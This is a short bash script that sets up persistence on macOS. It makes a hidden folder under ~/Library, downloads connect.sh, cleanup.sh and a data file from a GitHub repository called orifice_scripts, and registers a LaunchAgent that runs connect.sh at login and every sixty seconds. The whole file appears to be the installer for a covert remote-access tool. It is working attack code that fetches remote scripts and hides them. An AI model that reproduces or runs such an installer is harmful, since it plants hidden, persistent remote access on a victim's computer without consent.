#!/bin/bash
mkdir ~/Library/.hidden;
mkdir ~/Library/LaunchAgents;

wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh ~/Library/.hidden/connect.sh;
chmod +x ~/Library/.hidden/connect.sh;
wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt ~/Library/.hidden/stuff;
wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh ~/Library/.hidden/cleanup.sh;
chmod +x ~/Library/.hidden/cleanup.sh;

echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>com.gnerdsec.orifice</string>
<key>ProgramArguments</key>
<array>
<string>/bin/sh</string>
<string>'$HOME'/Library/.hidden/connect.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>60</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;

chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;

launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
